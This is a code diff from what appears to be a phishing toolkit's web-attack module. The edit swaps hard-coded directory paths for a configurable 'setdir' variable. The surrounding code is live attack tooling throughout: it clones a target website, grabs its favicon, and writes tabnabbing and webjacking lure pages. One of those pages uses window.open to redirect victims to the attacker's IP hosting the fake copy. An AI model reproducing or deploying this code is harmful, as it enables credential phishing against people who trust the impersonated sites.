@@ -18,13 +18,13 @@ for line in fileopen:
         webjacking_timing=line
 
 # grab attack_vector specification
-fileopen=file("src/program_junk/attack_vector", "r")
+fileopen=file(setdir + "/attack_vector", "r")
 for line in fileopen:
     attack_vector=line.rstrip()
 
 # need to see if we created file to trigger multi attack webjacking
 multi_webjacking="off"
-if os.path.isfile("src/program_junk/multi_webjacking"):
+if os.path.isfile(setdir + "/multi_webjacking"):
     multi_webjacking="on"
 
 
@@ -34,7 +34,7 @@ if check_options("IPADDR=") != 0:
     ipaddr = check_options("IPADDR=")
 
 # pull URL field so we can pull favicon later on
-fileopen=file("src/program_junk/site.template","r").readlines()
+fileopen=file(setdir + "/site.template","r").readlines()
 for line in fileopen:
     match=re.search("URL=",line)
     if match:
@@ -47,12 +47,12 @@ for line in fileopen:
             URL="http://"+URL
 
 # move cloned site to index2.html
-subprocess.Popen("mv src/program_junk/web_clone/index.html src/program_junk/web_clone/index2.html", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+subprocess.Popen("mv %s/web_clone/index.html %s/web_clone/index2.html" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 # grab the source and write it out to the cloned directory
 fileopen=file("src/webattack/tabnabbing/source.js", "r")
 # write it to dir
-filewrite=file("src/program_junk/web_clone/source.js", "w")
+filewrite=file(setdir + "/web_clone/source.js", "w")
 # loop
 for line in fileopen:
     line=line.rstrip()
@@ -65,10 +65,10 @@ filewrite.close()
 if attack_vector == "tabnabbing":
     # grab favicon
     favicon = urllib2.urlopen("%s/favicon.ico" % (URL))
-    output = open('src/program_junk/web_clone/favicon.ico','wb')
+    output = open(setdir + '/web_clone/favicon.ico','wb')
     output.write(favicon.read())
     output.close()
-    filewrite1=file("src/program_junk/web_clone/index.html", "w")
+    filewrite1=file(setdir + "/web_clone/index.html", "w")
     filewrite1.write('<head><script type="text/javascript" src="source.js"></script></head>\n')
     filewrite1.write("<body>\n")
     filewrite1.write("Please wait while the site loads...\n")
@@ -77,7 +77,7 @@ if attack_vector == "tabnabbing":
 
 # define webjackign or multi webjacking here
 if attack_vector == "webjacking" or multi_webjacking == "on":
-    filewrite1=file("src/program_junk/web_clone/index.html", "w")
+    filewrite1=file(setdir + "/web_clone/index.html", "w")
     filewrite1.write("<script>\n")
     filewrite1.write("function a(){\n")
     filewrite1.write('''a= window.open("http://%s/index2.html", "iframe", "");\n''' % (ipaddr));
